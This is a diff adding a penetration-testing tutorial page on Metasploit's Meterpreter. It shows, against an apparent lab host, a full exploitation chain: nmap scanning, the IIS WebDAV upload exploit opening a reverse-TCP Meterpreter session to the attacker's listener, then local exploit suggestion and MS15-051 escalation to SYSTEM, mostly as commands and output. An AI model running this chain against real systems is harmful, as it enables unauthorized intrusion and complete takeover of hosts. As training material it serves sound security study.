@@ -1,0 +1,218 @@
+---
+title: "Meterpreter"
+description: "Meterpreter payload, post-exploitation, and privilege escalation workflows."
+---
+
+## Meterpreter
+
+The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.
+
+It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.
+
+## Running Meterpreter
+
+To run Meterpreter, we only need to select any version of it from the show payloads output, taking into consideration the type of connection and OS we are attacking.
+
+Whenever the Meterpreter Payload is sent and run on the target system, we receive a Meterpreter shell. We can then immediately issue the help command to see what the Meterpreter shell is capable of.
+
+## Using Meterpreter
+
+We have already delved into the basics of Meterpreter in the Payloads section. Now, we will look at the real strengths of the Meterpreter shell and how it can bolster the assessment's effectiveness and save time during an engagement. We start by running a basic scan against a known target. We will do this a-la-carte, doing everything from inside msfconsole to benefit from the data tracking on our target.
+
+### MSF - Scanning Target
+
+```shellsession
+msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
+
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
+[*] Nmap: Nmap scan report for 10.10.10.15
+[*] Nmap: Host is up (0.021s latency).
+[*] Nmap: Not shown: 65534 filtered ports
+[*] Nmap: PORT   STATE SERVICE VERSION
+[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
+[*] Nmap: | http-methods:
+[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
+[*] Nmap: |_http-title: Under Construction
+[*] Nmap: | http-webdav-scan:
+[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+[*] Nmap: |   WebDAV type: Unknown
+[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
+[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
+[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds
+
+msf6 > hosts
+
+Hosts
+=====
+
+address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------      ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.10.15             Unknown                    device
+
+msf6 > services
+
+Services
+========
+
+host         port  proto  name  state  info
+----         ----  -----  ----  -----  ----
+10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
+```
+
+However, looking at both the end of the webpage and the result of the Nmap scan more closely, we notice that the server is running Microsoft IIS httpd 6.0. So we further our research in that direction, searching for common vulnerabilities for this version of IIS. After some searching, we find the following marker for a widespread vulnerability: CVE-2017-7269. It also has a Metasploit module developed for it.
+
+### MSF - Searching for Exploit
+
+```shellsession
+msf6 > search iis_webdav_upload_asp
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
+```
+
+We proceed to set the needed parameters. For now, these would be LHOST and RHOST as everything else on the target seems to be running the default configuration.
+
+### MSF - Configuring Exploit & Payload
+
+```shellsession
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
+
+RHOST => 10.10.10.15
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
+
+LHOST => tun0
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
+
+[*] Started reverse TCP handler on 10.10.14.26:4444
+[*] Checking /metasploit28857905.asp
+[*] Uploading 612435 bytes to /metasploit28857905.txt...
+[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
+[*] Executing /metasploit28857905.asp...
+[*] Sending stage (175174 bytes) to 10.10.10.15
+[*] Deleting /metasploit28857905.asp (this doesn't always work)...
+[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
+[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000
+
+meterpreter >
+```
+
+We have our Meterpreter shell. However, take a close look at the output above. We can see a `.asp` file named metasploit28857905 exists on the target system at this very moment. Once the Meterpreter shell is obtained, as mentioned before, it will reside within memory. Therefore, the file is not needed, and removal was attempted by msfconsole, which failed due to access permissions. Leaving traces like these is not beneficial to the attacker and creates a huge liability.
+
+From the sysadmin's perspective, finding files that match this name type or slight variations of it can prove beneficial to stopping an attack in the middle of its tracks. Targeting regex matches against filenames or signatures as above will not even allow an attacker to spawn a Meterpreter shell before being cut down by the correctly configured security measures.
+
+We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.
+
+### Privilege Escalation with Local Exploit Suggester
+
+We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.
+
+### MSF - Session Handling
+
+```shellsession
+meterpreter > bg
+
+Background session 1? [y/N]  y
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+
+SESSION => 1
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 34 exploit checks are being tried...
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+```
+
+Running the recon module presents us with a multitude of options. Going through each separate one, we land on the ms15_051_client_copy_image entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.
+
+### MSF - Privilege Escalation
+
+```shellsession
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
+
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
+
+Module options (exploit/windows/local/ms15_051_client_copy_image):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
+
+session => 1
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
+
+LHOST => tun0
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > run
+
+[*] Started reverse TCP handler on 10.10.14.26:4444
+[*] Launching notepad to host the exploit...
+[+] Process 844 launched.
+[*] Reflectively injecting the exploit DLL into 844...
+[*] Injecting exploit into 844...
+[*] Exploit injected. Injecting payload into 844...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175174 bytes) to 10.10.10.15
+[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000
+
+meterpreter > getuid
+
+Server username: NT AUTHORITY\SYSTEM
+```
